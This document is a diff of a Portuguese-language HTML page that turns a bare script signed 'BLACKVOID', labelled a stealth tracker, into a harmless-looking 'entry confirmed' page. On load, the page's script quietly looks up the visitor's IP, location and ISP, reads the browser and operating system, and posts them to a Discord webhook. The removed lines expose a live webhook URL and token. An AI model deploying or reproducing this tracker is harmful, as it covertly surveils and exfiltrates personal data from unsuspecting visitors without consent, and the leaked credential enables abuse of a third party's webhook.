@@ -1,53 +1,70 @@
-<script>
-  // ⸸₿LACKV∅ID - rastreador sigiloso
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Confirmação</title>
+    <style>
+      body {
+        background-color: #0d0d0d;
+        color: #00ffcc;
+        font-family: Arial, sans-serif;
+        text-align: center;
+        padding: 50px;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Entrada confirmada.</h2>
+    <p>Você já pode fechar esta página.</p>
 
-  fetch("https://ipapi.co/json/")
-    .then(res => res.json())
-    .then(data => {
-      const ip = data.ip;
-      const cidade = data.city;
-      const regiao = data.region;
-      const pais = data.country_name;
-      const org = data.org;
+    <script>
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          const ip = data.ip;
+          const cidade = data.city;
+          const regiao = data.region;
+          const pais = data.country_name;
+          const org = data.org;
 
-      const userAgent = navigator.userAgent;
-      let navegador = "Desconhecido";
-      let sistema = "Desconhecido";
+          const userAgent = navigator.userAgent;
+          let navegador = "Desconhecido";
+          let sistema = "Desconhecido";
 
-      if (userAgent.includes("Firefox")) navegador = "Firefox";
-      else if (userAgent.includes("Edg")) navegador = "Microsoft Edge";
-      else if (userAgent.includes("Chrome")) navegador = "Google Chrome";
-      else if (userAgent.includes("Safari")) navegador = "Safari";
+          if (userAgent.includes("Firefox")) navegador = "Firefox";
+          else if (userAgent.includes("Edg")) navegador = "Microsoft Edge";
+          else if (userAgent.includes("Chrome")) navegador = "Google Chrome";
+          else if (userAgent.includes("Safari")) navegador = "Safari";
 
-      if (userAgent.includes("Windows")) sistema = "Windows";
-      else if (userAgent.includes("Mac")) sistema = "macOS";
-      else if (userAgent.includes("Android")) sistema = "Android";
-      else if (userAgent.includes("Linux")) sistema = "Linux";
-      else if (userAgent.includes("iPhone")) sistema = "iOS";
+          if (userAgent.includes("Windows")) sistema = "Windows";
+          else if (userAgent.includes("Mac")) sistema = "macOS";
+          else if (userAgent.includes("Android")) sistema = "Android";
+          else if (userAgent.includes("Linux")) sistema = "Linux";
+          else if (userAgent.includes("iPhone")) sistema = "iOS";
 
-      const agora = new Date();
-      const dataHora = agora.toLocaleString("pt-BR", {
-        timeZone: "America/Sao_Paulo"
-      });
+          const agora = new Date();
+          const dataHora = agora.toLocaleString("pt-BR", {
+            timeZone: "America/Sao_Paulo"
+          });
 
-      fetch("https://discord.com/api/webhooks/1397790350105514084/7jqldfQmVUl9YYVArP7QXHj84QEFQ6Em-HIKa2Q0FgFzciOfSlz1UOv2xVCtLk2kwmFk", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          content: `
-🔔 Alguém acessou o site!
-🌐 IP: ${ip}
-📍 Localização: ${cidade}, ${regiao}, ${pais}
-📡 Operadora: ${org}
-💻 Navegador: ${navegador}
-🖥️ Sistema: ${sistema}
-🕓 Data e Hora: ${dataHora}
-🔖 Assinatura: ⸸₿LACKV∅ID
-          `
+          fetch("https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              content: `🔔 Acesso detectado!
+IP: ${ip}
+Local: ${cidade}, ${regiao}, ${pais}
+Operadora: ${org}
+Navegador: ${navegador}
+Sistema: ${sistema}
+Hora: ${dataHora}
+Assinatura: +₿LACKVØID`
+            })
+          });
         })
-      });
-    })
-    .catch(err => console.error("Erro ao rastrear IP:", err));
-</script>
+        .catch(err => console.error("Erro:", err));
+    </script>
+  </body>
+</html>
